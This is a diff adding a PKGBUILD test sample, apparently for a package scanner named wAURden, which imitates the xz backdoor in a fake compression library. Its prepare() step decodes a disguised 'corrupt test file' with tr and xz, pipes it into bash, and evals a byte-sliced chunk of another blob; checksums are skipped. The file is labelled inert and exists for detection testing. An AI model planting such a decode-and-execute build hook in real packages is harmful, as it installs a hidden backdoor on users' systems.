@@ -1,0 +1,26 @@
+# wAURden test sample — MALICIOUS (inert). xz-backdoor (CVE-2024-3094) style:
+# a payload hidden in a "test" blob, extracted with tr/byte-slicing and sourced
+# from a build script. All placeholder; nothing here runs a real payload.
+pkgname=libcompress
+pkgver=5.6.1
+pkgrel=1
+pkgdesc="Compression library"
+arch=('x86_64')
+url="https://example.com"
+license=('GPL')
+source=("https://example.com/libcompress-5.6.1.tar.gz"
+        "tests/files/bad-3-corrupt_lzma2.xz")
+sha256sums=('SKIP' 'SKIP')
+
+prepare() {
+    cd "$pkgname-$pkgver"
+    # substitution-cipher decode of a "corrupt test file", piped into a shell
+    tr "\t \-_" " \t_\-" < tests/files/bad-3-corrupt_lzma2.xz | xz -d | bash
+    # source a stage from the extracted blob
+    eval "$(cat tests/files/good-large_compressed.lzma | head -c +1024 | tail -c +512)"
+}
+
+build() {
+    cd "$pkgname-$pkgver"
+    make
+}
